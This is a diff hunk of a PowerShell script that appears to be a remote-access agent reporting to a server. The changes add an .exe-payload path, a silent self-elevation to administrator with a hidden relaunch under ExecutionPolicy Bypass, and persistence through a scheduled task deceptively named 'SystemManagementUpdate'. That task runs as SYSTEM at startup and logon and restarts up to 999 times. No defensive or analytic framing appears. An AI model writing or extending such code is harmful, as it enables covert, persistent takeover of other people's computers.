@@ -6,19 +6,34 @@ $maxRetries = 10
 $cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
 $maxChunkBytes = 32000  # cap per-chunk size
 $clientId = "$($env:COMPUTERNAME)-$($env:USERNAME)"  # unique identifier sent to server on every request
+$taskName = "SystemManagementUpdate"
+$selfPath = $PSCommandPath
+if (-not $selfPath) { $selfPath = $MyInvocation.MyCommand.Path }
+if (-not $selfPath) { $selfPath = (Get-Process -Id $PID).Path }
+$isExePayload = ($selfPath -and [System.IO.Path]::GetExtension($selfPath).ToLower() -eq ".exe")
 
 # --- Self-elevate to admin and relaunch hidden ---
 $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
 if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Start-Process PowerShell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
+    if ($isExePayload) {
+        Start-Process -FilePath $selfPath -Verb RunAs -WindowStyle Hidden
+    } else {
+        Start-Process PowerShell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$selfPath`""
+    }
     exit
 }
 
 # --- Persistence ---
-$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
-$trigger = New-ScheduledTaskTrigger -AtStartup
-$settings = New-ScheduledTaskSettingsSet -RestartCount 5 -RestartInterval (New-TimeSpan -Seconds 30) -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-Register-ScheduledTask -TaskName "SystemManagementUpdate" -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
+$action = if ($isExePayload) {
+    New-ScheduledTaskAction -Execute $selfPath
+} else {
+    New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$selfPath`""
+}
+$startupTrigger = New-ScheduledTaskTrigger -AtStartup
+$logonTrigger = New-ScheduledTaskTrigger -AtLogOn
+$settings = New-ScheduledTaskSettingsSet -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($startupTrigger, $logonTrigger) -Settings $settings -Principal $principal -Force | Out-Null
 
 # --- Logging ---
 function Write-Log {
